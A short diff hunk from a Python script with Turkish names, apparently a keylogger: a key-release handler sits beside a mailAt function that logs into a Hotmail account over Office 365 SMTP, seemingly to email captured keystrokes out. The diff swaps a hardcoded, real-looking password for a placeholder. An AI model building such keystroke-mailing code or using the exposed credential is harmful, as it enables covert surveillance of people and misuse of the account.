@@ -50,7 +50,7 @@ def on_release(key):
 
 def mailAt(gonderilcekMail):
     kullanıcı = "denemecsharp@hotmail.com"
-    sifre = "05464335192van"
+    sifre = "sifrem:)"
     port = 587
     host = "smtp.office365.com"
     context = ssl.create_default_context()
